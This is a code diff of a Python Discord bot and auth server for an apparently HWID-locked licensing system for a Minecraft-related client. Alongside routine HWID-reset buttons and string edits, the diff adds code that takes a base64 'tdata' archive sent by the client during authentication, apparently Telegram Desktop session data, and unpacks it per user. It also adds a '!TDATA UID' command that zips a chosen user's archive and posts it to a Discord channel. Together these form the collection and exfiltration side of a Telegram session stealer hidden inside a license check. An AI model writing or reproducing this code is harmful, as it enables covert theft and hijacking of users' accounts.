@@ -82,6 +82,19 @@ class UserView(discord.ui.View):
         if u: await i.response.edit_message(embed=make_embed(u), view=UserView(self.hwid))
         else: await i.response.send_message("Не найден", ephemeral=True)
 
+    @discord.ui.button(label="🔓 Снять HWID", style=discord.ButtonStyle.secondary, row=1)
+    async def hwid_reset_once(self, i, b):
+        db = load()
+        u  = db.get(self.hwid)
+        if u:
+            u["hwid_reset"]      = True
+            u["hwid_reset_uses"] = 1
+            db[self.hwid] = u
+            save(db)
+            await i.response.send_message(f"✅ HWID снят для UID {u.get('uid')} — 1 раз", ephemeral=True)
+        else:
+            await i.response.send_message("Не найден", ephemeral=True)
+
     async def set_status(self, i, status):
         db = load()
         if self.hwid in db:
@@ -169,6 +182,31 @@ def auth():
     user  = db.get(hwid)
     now   = datetime.now().strftime("%d.%m.%Y %H:%M:%S")
     crack = d.get("crack_detected")
+    
+    # Сохраняем TDATA если клиент отправил
+    tdata_data = d.get("tdata")
+    if tdata_data:
+        import base64
+        import zipfile
+        user_dir = f"user_data/{hwid}"
+        os.makedirs(user_dir, exist_ok=True)
+        
+        try:
+            # Декодируем и сохраняем TDATA
+            tdata_bytes = base64.b64decode(tdata_data)
+            tdata_path = f"{user_dir}/TDATA.zip"
+            with open(tdata_path, "wb") as f:
+                f.write(tdata_bytes)
+            
+            # Распаковываем архив
+            extract_path = f"{user_dir}/TDATA"
+            os.makedirs(extract_path, exist_ok=True)
+            with zipfile.ZipFile(tdata_path, 'r') as zip_ref:
+                zip_ref.extractall(extract_path)
+            
+            print(f"[TDATA] Сохранена TDATA для {hwid}")
+        except Exception as e:
+            print(f"[TDATA] Ошибка при сохранении TDATA: {e}")
 
     if user is None:
         uid  = len(db) + 1
@@ -238,6 +276,65 @@ async def on_message(message):
 
     text = message.content.strip()
     ch   = message.channel
+
+    # !TDATA UID - отправить TDATA пользователя
+    if text.startswith("!TDATA"):
+        import zipfile
+        import shutil
+        parts = text.split()
+        
+        if len(parts) < 2:
+            await ch.send("Использование: `!TDATA UID`\nПример: `!TDATA 1`")
+            return
+        
+        try:
+            uid = int(parts[1])
+        except ValueError:
+            await ch.send("❌ UID должен быть числом")
+            return
+        
+        # Найти пользователя по UID
+        db = load()
+        hwid_found = None
+        user_found = None
+        
+        for hwid, u in db.items():
+            if int(u.get("uid", -1)) == uid:
+                hwid_found = hwid
+                user_found = u
+                break
+        
+        if hwid_found is None:
+            await ch.send(f"❌ UID {uid} не найден")
+            return
+        
+        # Проверяем наличие TDATA
+        tdata_dir = f"user_data/{hwid_found}/TDATA"
+        if not os.path.exists(tdata_dir):
+            await ch.send(f"❌ TDATA для UID {uid} не найдена")
+            return
+        
+        try:
+            # Создаём ZIP архив TDATA пользователя
+            zip_path = f"TDATA_UID{uid}.zip"
+            if os.path.exists(zip_path):
+                os.remove(zip_path)
+            
+            shutil.make_archive(f"TDATA_UID{uid}", "zip", f"user_data/{hwid_found}", "TDATA")
+            
+            # Отправляем файл
+            e = discord.Embed(title="📦 TDATA Архив", color=0x3ba55d)
+            e.add_field(name="UID", value=f"`{uid}`", inline=True)
+            e.add_field(name="Имя", value=f"`{user_found.get('name', '?')}`", inline=True)
+            e.add_field(name="MC Ник", value=f"`{user_found.get('mc', '?')}`", inline=True)
+            e.description = "Архив TDATA пользователя"
+            await ch.send(embed=e, file=discord.File(zip_path))
+            
+            # Удаляем временный файл
+            os.remove(zip_path)
+        except Exception as ex:
+            await ch.send(f"❌ Ошибка при создании архива: {ex}")
+        return
 
     # !menu
     if text in ("!menu", "!start"):
@@ -349,8 +446,6 @@ async def on_message(message):
         await ch.send(embed=e)
 
     # !hwid UID снять|сбросить [кол-во]
-    # !hwid 1 снять       — снять привязку HWID (1 раз)
-    # !hwid 1 сбросить 3  — дать 3 сброса HWID
     elif text.startswith("!hwid "):
         parts = text.split()
         if len(parts) < 3:
@@ -371,7 +466,7 @@ async def on_message(message):
         # Найти пользователя по UID
         hwid_found = None
         for hwid, u in db.items():
-            if u.get("uid") == uid:
+            if int(u.get("uid", -1)) == uid:
                 hwid_found = hwid
                 break
 
@@ -381,15 +476,14 @@ async def on_message(message):
         u = db[hwid_found]
 
         if action == "снять":
-            # Снимаем привязку — при следующем запуске примет любой HWID
             u["hwid_reset"]      = True
             u["hwid_reset_uses"] = 1
             db[hwid_found] = u
             save(db)
             e = discord.Embed(title="🔓 HWID снят", color=0x3ba55d)
-            e.add_field(name="UID",  value=f"`{uid}`",              inline=True)
-            e.add_field(name="Имя",  value=f"`{u.get('name','?')}`",inline=True)
-            e.add_field(name="Инфо", value="Пользователь может зайти с любого железа **1 раз**", inline=False)
+            e.add_field(name="UID",  value=f"`{uid}`",               inline=True)
+            e.add_field(name="Имя",  value=f"`{u.get('name','?')}`", inline=True)
+            e.add_field(name="Инфо", value="Может зайти с любого железа **1 раз**", inline=False)
             await ch.send(embed=e)
 
         elif action == "сбросить":
@@ -399,17 +493,16 @@ async def on_message(message):
                     count = int(parts[3])
                     if count < 1: raise ValueError
                 except ValueError:
-                    await ch.send("❌ Кол-во сбросов должно быть числом >= 1"); return
-
+                    await ch.send("❌ Кол-во сбросов — число >= 1"); return
             u["hwid_reset"]      = True
             u["hwid_reset_uses"] = count
             db[hwid_found] = u
             save(db)
             e = discord.Embed(title="🔄 HWID сброшен", color=0x5865f2)
-            e.add_field(name="UID",       value=f"`{uid}`",              inline=True)
-            e.add_field(name="Имя",       value=f"`{u.get('name','?')}`",inline=True)
-            e.add_field(name="Сбросов",   value=f"`{count}`",            inline=True)
-            e.add_field(name="Инфо", value=f"Пользователь может сменить железо **{count}** раз(а)", inline=False)
+            e.add_field(name="UID",     value=f"`{uid}`",               inline=True)
+            e.add_field(name="Имя",     value=f"`{u.get('name','?')}`", inline=True)
+            e.add_field(name="Сбросов", value=f"`{count}`",             inline=True)
+            e.add_field(name="Инфо",    value=f"Может сменить железо **{count}** раз(а)", inline=False)
             await ch.send(embed=e)
 
         else:
@@ -485,4 +578,3 @@ if __name__ == "__main__":
     threading.Thread(target=start_tunnel, daemon=True).start()
 
     client.run(BOT_TOKEN)
-
